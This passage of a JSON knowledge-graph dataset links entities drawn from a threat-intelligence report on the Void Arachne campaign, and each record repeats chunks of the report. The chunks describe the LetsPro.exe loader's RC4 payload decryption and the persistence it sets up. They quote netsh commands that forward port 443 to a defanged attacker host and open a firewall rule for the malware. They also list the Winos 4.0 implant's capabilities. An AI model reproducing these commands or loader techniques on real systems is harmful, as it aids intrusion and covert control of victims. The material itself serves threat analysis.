demonstrates the core part of the loader logic:  \nThe following snippet demonstrates the decrypted file 1 structure in memory:",
          "chunk_length": 1313,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Trojan loader *LetsPro.exe* analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Trojan loader *LetsPro.exe* analysis"
            ],
            "content_type": "text",
            "token_length": 273,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 14,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ABSTRACT",
      "source": "procedure--payload-decryption",
      "target": "technique--memory-execution",
      "confidence": 0.95,
      "evidence": "Payload decryption process abstracts to memory execution technique",
      "chunks_info": [
        {
          "chunk_id": 14,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Trojan loader *LetsPro.exe* analysis\n\n*LetsPro.exe* is a trojan loader that decrypts, maps, and executes a second-stage payload in memory. The loader first reads and loads the content of a file named “1”, with the following content structure:  \nstruct payload\\_struct {\nuint32\\_t flag; // 1 if the data is encrypted, 0 if it's plaintext/Memory clean up\nuint32\\_t fileSize; // Size of the encrypted data in bytes\nchar encryptedData[]; // The encrypted payload\n};  \nIt then identifies the encrypted data section within the file. The initial part of the file structure contains a flag set to 1, which indicates encryption. The loader uses the Rivest Cipher 4 (RC4) algorithm with the key \"0x678E0B00\" to decrypt this data. After decryption, the payload, which is now executable code, is mapped into the process's memory space and executed.  \nThe decryption key structure is defined as follows:  \nstruct decryption\\_key\\_struct {\nuint32\\_t memory\\_cleanup; // Flag for memory cleanup after decryption\nuint32\\_t keySize; // Size of the decryption key\nchar key[]; // Decryption key\n};  \nThe following code snippet demonstrates the core part of the loader logic:  \nThe following snippet demonstrates the decrypted file 1 structure in memory:",
          "chunk_length": 1313,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Trojan loader *LetsPro.exe* analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Trojan loader *LetsPro.exe* analysis"
            ],
            "content_type": "text",
            "token_length": 273,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 14,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "procedure--vbscript-persistence",
      "confidence": 0.95,
      "evidence": "报告记录了通过VBScript实现持久化的程序",
      "chunks_info": [
        {
          "chunk_id": 16,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nAfter the second-stage loader (file “1”) is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts with *CreateSvc\\_* to execute the VBScript file. At the time of research, the batch file was not available.  \nAfter that, the malware replicates the loader, VBScript, and the file “1” within the user directory.",
          "chunk_length": 765,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 141,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 16,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "procedure--vbscript-persistence",
      "target": "tool--vbscript",
      "confidence": 0.95,
      "evidence": "程序使用VBScript脚本",
      "chunks_info": [
        {
          "chunk_id": 16,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nAfter the second-stage loader (file “1”) is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts with *CreateSvc\\_* to execute the VBScript file. At the time of research, the batch file was not available.  \nAfter that, the malware replicates the loader, VBScript, and the file “1” within the user directory.",
          "chunk_length": 765,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 141,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 16,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ABSTRACT",
      "source": "procedure--vbscript-persistence",
      "target": "technique--persistence",
      "confidence": 0.95,
      "evidence": "程序抽象为通过计划任务实现持久化的技术",
      "chunks_info": [
        {
          "chunk_id": 16,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nAfter the second-stage loader (file “1”) is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts with *CreateSvc\\_* to execute the VBScript file. At the time of research, the batch file was not available.  \nAfter that, the malware replicates the loader, VBScript, and the file “1” within the user directory.",
          "chunk_length": 765,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 141,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 16,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ABSTRACT",
      "source": "procedure--service-creation",
      "target": "technique--service-execution",
      "confidence": 0.95,
      "evidence": "程序抽象为通过服务执行恶意代码的技术",
      "chunks_info": [
        {
          "chunk_id": 16,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nAfter the second-stage loader (file “1”) is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts with *CreateSvc\\_* to execute the VBScript file. At the time of research, the batch file was not available.  \nAfter that, the malware replicates the loader, VBScript, and the file “1” within the user directory.",
          "chunk_length": 765,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 141,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 16,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "asset--user-directory",
      "target": "procedure--file-replication",
      "confidence": 0.95,
      "evidence": "用户目录用于存储恶意文件",
      "chunks_info": [
        {
          "chunk_id": 16,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nAfter the second-stage loader (file “1”) is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts with *CreateSvc\\_* to execute the VBScript file. At the time of research, the batch file was not available.  \nAfter that, the malware replicates the loader, VBScript, and the file “1” within the user directory.",
          "chunk_length": 765,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 141,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 16,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--behind-great-wall",
      "target": "tool--file-1",
      "confidence": 0.95,
      "evidence": "报告中提到的文件",
      "chunks_info": [
        {
          "chunk_id": 17,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5** | **Parent directory** |\n| *1* | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *792258.vbs* | 2405 | CD95B5408531DC5342180A1BECE74757 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *LetsPRO.exe* | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |",
          "chunk_length": 513,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "table",
            "token_length": 153,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 17,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--behind-great-wall",
      "target": "tool--792258.vbs",
      "confidence": 0.95,
      "evidence": "报告中提到的文件",
      "chunks_info": [
        {
          "chunk_id": 17,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5** | **Parent directory** |\n| *1* | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *792258.vbs* | 2405 | CD95B5408531DC5342180A1BECE74757 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *LetsPRO.exe* | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |",
          "chunk_length": 513,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "table",
            "token_length": 153,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 17,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--behind-great-wall",
      "target": "tool--LetsPRO.exe",
      "confidence": 0.95,
      "evidence": "报告中提到的文件",
      "chunks_info": [
        {
          "chunk_id": 17,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5** | **Parent directory** |\n| *1* | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *792258.vbs* | 2405 | CD95B5408531DC5342180A1BECE74757 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *LetsPRO.exe* | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |",
          "chunk_length": 513,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "table",
            "token_length": 153,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 17,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "procedure--port-forwarding",
      "confidence": 0.95,
      "evidence": "报告记录了端口转发配置过程",
      "chunks_info": [
        {
          "chunk_id": 18,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nThe malware also uses the *netsh* command to set up port forwarding and configure firewall rules named “Safe<integer>” on the victim’s machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.  \nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (*103.214.147.14[.]webcamcn[.]xyz*), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.  \nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443  \nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"  \nFinally, the malware passes the execution to the Winos 4.0 stager in memory.",
          "chunk_length": 1269,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 274,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 18,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--port-forwarding",
      "target": "tool--netsh",
      "confidence": 0.95,
      "evidence": "端口转发过程使用netsh工具",
      "chunks_info": [
        {
          "chunk_id": 18,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nThe malware also uses the *netsh* command to set up port forwarding and configure firewall rules named “Safe<integer>” on the victim’s machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.  \nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (*103.214.147.14[.]webcamcn[.]xyz*), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.  \nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443  \nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"  \nFinally, the malware passes the execution to the Winos 4.0 stager in memory.",
          "chunk_length": 1269,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 274,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 18,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--firewall-rule",
      "target": "tool--netsh",
      "confidence": 0.95,
      "evidence": "防火墙规则设置过程使用netsh工具",
      "chunks_info": [
        {
          "chunk_id": 18,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nThe malware also uses the *netsh* command to set up port forwarding and configure firewall rules named “Safe<integer>” on the victim’s machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.  \nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (*103.214.147.14[.]webcamcn[.]xyz*), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.  \nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443  \nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"  \nFinally, the malware passes the execution to the Winos 4.0 stager in memory.",
          "chunk_length": 1269,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 274,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 18,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--firewall-rule",
      "target": "tool--letspro-exe",
      "confidence": 0.95,
      "evidence": "防火墙规则允许LetsPRO.exe程序",
      "chunks_info": [
        {
          "chunk_id": 18,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nThe malware also uses the *netsh* command to set up port forwarding and configure firewall rules named “Safe<integer>” on the victim’s machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.  \nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (*103.214.147.14[.]webcamcn[.]xyz*), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.  \nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443  \nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"  \nFinally, the malware passes the execution to the Winos 4.0 stager in memory.",
          "chunk_length": 1269,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 274,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 18,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--winos-stager",
      "target": "tool--letspro-exe",
      "confidence": 0.95,
      "evidence": "Winos 4.0 stager执行依赖LetsPRO.exe",
      "chunks_info": [
        {
          "chunk_id": 18,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nThe malware also uses the *netsh* command to set up port forwarding and configure firewall rules named “Safe<integer>” on the victim’s machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.  \nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (*103.214.147.14[.]webcamcn[.]xyz*), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.  \nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443  \nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"  \nFinally, the malware passes the execution to the Winos 4.0 stager in memory.",
          "chunk_length": 1269,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 274,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 18,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--port-forwarding",
      "target": "asset--destination-server",
      "confidence": 0.95,
      "evidence": "端口转发目标为指定服务器",
      "chunks_info": [
        {
          "chunk_id": 18,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nThe malware also uses the *netsh* command to set up port forwarding and configure firewall rules named “Safe<integer>” on the victim’s machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.  \nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (*103.214.147.14[.]webcamcn[.]xyz*), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.  \nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443  \nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"  \nFinally, the malware passes the execution to the Winos 4.0 stager in memory.",
          "chunk_length": 1269,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 274,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 18,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--behind-great-wall",
      "target": "tool--winos-4.0",
      "confidence": 0.95,
      "evidence": "报告详细描述了Winos 4.0恶意软件的功能和特性",
      "chunks_info": [
        {
          "chunk_id": 19,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n\n### Winos 4.0 C&C framework overview  \nThe final payload of this attack is the Winos 4.0 implant, which is written in C++ and targets the Windows platform. Winos has features that include file management, [distributed denial of service (DDoS)](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cyber-attacks/security-101-distributed-denial-of-service-ddos-attacks) using TCP/UDP/ ICMP/HTTP, full disk search, webcam control, and screen capturing. Additionally, it supports many functionalities including process injection and microphone recording, system and service management, remote shell access, and keylogging functionalities, further enhancing its ability to control and monitor the infected system.  \nThe Winos C&C server is equipped with 23 internal plugins, each compiled in both 32- and 64-bit versions, to execute a variety of tasks. Table 3 shows the complete list of these plugins, along with their respective SHA256 hashes:",
          "chunk_length": 1019,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 210,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 19,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "tool--winos-4.0",
      "target": "technique--ddos",
      "confidence": 0.95,
      "evidence": "Winos 4.0支持通过TCP/UDP/ICMP/HTTP协议发起DDoS攻击",
      "chunks_info": [
        {
          "chunk_id": 19,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n\n### Winos 4.0 C&C framework overview  \nThe final payload of this attack is the Winos 4.0 implant, which is written in C++ and targets the Windows platform. Winos has features that include file management, [distributed denial of service (DDoS)](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cyber-attacks/security-101-distributed-denial-of-service-ddos-attacks) using TCP/UDP/ ICMP/HTTP, full disk search, webcam control, and screen capturing. Additionally, it supports many functionalities including process injection and microphone recording, system and service management, remote shell access, and keylogging functionalities, further enhancing its ability to control and monitor the infected system.  \nThe Winos C&C server is equipped with 23 internal plugins, each compiled in both 32- and 64-bit versions, to execute a variety of tasks. Table 3 shows the complete list of these plugins, along with their respective SHA256 hashes:",
          "chunk_length": 1019,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 210,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 19,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "tool--winos-4.0",
      "target": "technique--process-injection",
      "confidence": 0.95,
      "evidence": "Winos 4.0支持进程注入功能",
      "chunks_info": [
        {
          "chunk_id": 19,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n\n### Winos 4.0 C&C framework overview  \nThe final payload of this attack is the Winos 4.0 implant, which is written in C++ and targets the Windows platform. Winos has features that include file management, [distributed denial of service (DDoS)](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cyber-attacks/security-101-distributed-denial-of-service-ddos-attacks) using TCP/UDP/ ICMP/HTTP, full disk search, webcam control, and screen capturing. Additionally, it supports many functionalities including process injection and microphone recording, system and service management, remote shell access, and keylogging functionalities, further enhancing its ability to control and monitor the infected system.  \nThe Winos C&C server is equipped with 23 internal plugins, each compiled in both 32- and 64-bit versions, to execute a variety of tasks. Table 3 shows the complete list of these plugins, along with their respective SHA256 hashes:",
          "chunk_length": 1019,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 210,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 19,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "tool--winos-4.0",
      "target": "technique--keylogging",
      "confidence": 0.95,
      "evidence": "Winos 4.0支持键盘记录功能",
      "chunks_info": [
        {
          "chunk_id": 19,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n\n### Winos 4.0 C&C framework overview  \nThe final payload of this attack is the Winos 4.0 implant, which is written in C++ and targets the Windows platform. Winos has features that include file management, [distributed denial of service (DDoS)](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cyber-attacks/security-101-distributed-denial-of-service-ddos-attacks) using TCP/UDP/ ICMP/HTTP, full disk search, webcam control, and screen capturing. Additionally, it supports many functionalities including process injection and microphone recording, system and service management, remote shell access, and keylogging functionalities, further enhancing its ability to control and monitor the infected system.  \nThe Winos C&C server is equipped with 23 internal plugins, each compiled in both 32- and 64-bit versions, to execute a variety of tasks. Table 3 shows the complete list of these plugins, along with their respective SHA256 hashes:",
          "chunk_length": 1019,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
